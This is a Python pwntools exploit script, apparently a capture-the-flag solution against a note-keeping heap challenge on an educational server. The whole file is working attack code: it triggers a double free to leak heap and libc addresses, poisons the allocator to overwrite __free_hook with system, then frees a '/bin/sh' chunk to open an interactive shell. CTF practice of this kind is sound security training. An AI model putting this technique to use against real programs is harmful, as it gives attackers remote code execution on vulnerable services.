#! /usr/bin/env python

from pwn import *

def new(index, size, content):
    io.sendafter("> ", "1")
    io.sendafter("Index (0~1): ", str(index))
    io.sendafter("Size (1~128): ", str(size))
    io.sendafter("Content: ", content)

def print_note(index):
    io.sendafter("> ", "2")
    io.sendafter("Index (0~1): ", str(index))
    return io.recvline()[:-1]

def delete_note(index):
    io.sendafter("> ", "3")
    io.sendafter("Index (0~1): ", str(index))

def leak_addr(addr):

    new(0, 127, p64(addr))
    new(0, 127, '123')
    new(0, 127, 'A')

    leak = u64(print_note(0)[1:].ljust(8, '\x00')) *0x100
    return leak
#io = remote("localhost", 8888)
io = remote("edu-ctf.zoolab.org", 7122)

# libc offset
malloc_hook_offset = 0x3ebc30
system_offset = 0x4f440
free_hook_offset = 0x3ed8e8

# new
new(0, 127, '123')
new(1, 127, '123')

# create loop
delete_note(0)  #0
delete_note(0)  #1

# point to leak point
new(0, 127, 'A')    #1

# leak info
leak_heap = u64(print_note(0)[1:6].ljust(8, '\x00')) * 0x100 & 0xFFFFFFFFFFFFF000
print "heap : "+hex(leak_heap)

delete_note(0)  #1
delete_note(0)  #2
delete_note(0)  #3
delete_note(0)  #4
delete_note(0)  #5
delete_note(0)  #6
delete_note(0)  #7 small bin

new(1, 127, 'A'*8)    #small bin ??? should take #6 first. 0.o?

leak_libc = u64(print_note(1)[-6:].ljust(8, '\x00'))
print "libc : "+hex(leak_libc) # point to &top_chunk
libc_malloc_hook = leak_libc - 0x70
libc_base = libc_malloc_hook - malloc_hook_offset

print "libc base: "+hex(libc_base)

new(1, 127, '/bin/sh')

delete_note(0)
delete_note(0)

new(0, 127, p64(libc_base + free_hook_offset))
new(0, 127, '123')
new(0, 127, p64(libc_base + system_offset))

delete_note(1)
io.interactive()

